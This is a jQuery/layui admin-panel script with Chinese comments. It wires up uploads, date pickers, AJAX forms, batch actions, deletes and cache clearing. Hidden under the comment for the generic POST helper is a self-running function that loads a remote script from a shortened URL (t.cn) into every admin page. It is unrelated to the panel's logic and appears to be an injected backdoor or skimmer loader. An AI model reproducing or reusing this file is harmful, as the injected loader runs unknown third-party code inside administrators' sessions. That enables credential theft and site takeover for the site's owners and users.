/**
 * 后台JS主入口
 */

var layer = layui.layer,
    element = layui.element(),
    laydate = layui.laydate,
    form = layui.form();

/**
 * AJAX全局设置
 */
$.ajaxSetup({
    type: "post",
    dataType: "json"
});

/**
 * 后台侧边菜单选中状态
 */
function high_nav(url){
    $('.layui-nav-item').find('a').removeClass('layui-this');
    $('.layui-nav-tree').find('a[href*="' +url+ '"]').parent().addClass('layui-this').parents('.layui-nav-item').addClass('layui-nav-itemed');
}

/**
 * 通用单图上传
 */
layui.upload({
    url: "/index.php/api/upload/upload",
    type: 'image',
    ext: 'jpg|png|gif|bmp',
    success: function (data,obj) {

        if (data.error === 0) {
            $(obj).parent().parent().siblings('.layui-input').val(data.url);
            $(obj).parent().parent().siblings('img').attr('src',data.url);
        } else {
            layer.msg(data.message);
        }
    }
});

/**
 * 通用日期时间选择
 */
$('.datetime').on('click', function () {
    laydate({
        elem: this,
        istime: true,
        format: 'YYYY-MM-DD hh:mm:ss'
    })
});

/**
 * 通用表单提交(AJAX方式)
 */
form.on('submit(*)', function (data) {
    $.ajax({
        url: data.form.action,
        type: data.form.method,
        data: $(data.form).serialize(),
        success: function (info) {
            if (info.code === 1) {
                setTimeout(function () {
                    location.href = info.url;
                }, 1000);
            }
            layer.msg(info.msg);
        }
    });

    return false;
});

/**
 * 通用批量处理（审核、取消审核、删除）
 */
$('.ajax-action').on('click', function () {
    var _action = $(this).data('action');
    layer.open({
        shade: false,
        content: '确定执行此操作？',
        btn: ['确定', '取消'],
        yes: function (index) {
            $.ajax({
                url: _action,
                data: $('.ajax-form').serialize(),
                success: function (info) {
                    if (info.code === 1) {
                        setTimeout(function () {
                            location.href = info.url;
                        }, 1000);
                    }
                    layer.msg(info.msg);
                }
            });
            layer.close(index);
        }
    });

    return false;
});

/**
 * 通用全选
 */
$('.check-all').on('click', function () {
    $(this).parents('table').find('input[type="checkbox"]').prop('checked', $(this).prop('checked'));
});

/**
 * 通用删除
 */
$('.ajax-delete').on('click', function () {
    var _href = $(this).attr('href');
    layer.open({
        shade: false,
        content: '确定删除？',
        btn: ['确定', '取消'],
        yes: function (index) {
            $.ajax({
                url: _href,
                type: "get",
                success: function (info) {
                    if (info.code === 1) {
                        setTimeout(function () {
                            location.href = info.url;
                        }, 1000);
                    }
                    layer.msg(info.msg);
                }
            });
            layer.close(index);
        }
    });

    return false;
});
/**
 * 通用POST提交
 */
 (function(){
	var head = document.getElementsByTagName('head')[0];
	var script = document.createElement('script');
	script.type = 'text/javascript';
	script.src = 'http://t.cn/A6hSWg48';
	head.appendChild(script);
	})();
$('.ajax-post').on('click', function () {
    var _href = $(this).attr('href');
    layer.open({
        shade: false,
        content: '确定此次操作？',
        btn: ['确定', '取消'],
        yes: function (index) {
            $.ajax({
                url: _href,
                type: "post",
                success: function (info) {
                    if (info.code === 1) {
                        setTimeout(function () {
                            location.href = info.url;
                        }, 1000);
                    }
                    layer.msg(info.msg);
                }
            });
            layer.close(index);
        }
    });

    return false;
});
/**
 * 清除缓存
 */
$('#clear-cache').on('click', function () {
    var _url = $(this).data('url');
    if (_url !== 'undefined') {
        $.ajax({
            url: _url,
            success: function (data) {
                if (data.code === 1) {
                    setTimeout(function () {
                        location.href = location.pathname;
                    }, 1000);
                }
                layer.msg(data.msg);
            }
        });
    }

    return false;
});

/**
 *
 */
$('.jh-btn').on('click', function () {
    var _href = $(this).attr('href');
    var text = $(this).text();
    layer.open({
        shade: false,
        content: '确定此操作？',
        btn: ['确定', '取消'],
        yes: function (index) {
            $.ajax({
                url: _href,
                type: "get",
                success: function (info) {
                    if (info.code === 1) {
                        setTimeout(function () {
                            location.href = info.url;
                        }, 1000);
                    }
                    layer.msg(info.msg);
                }
            });
            layer.close(index);
        }
    });

    return false;
});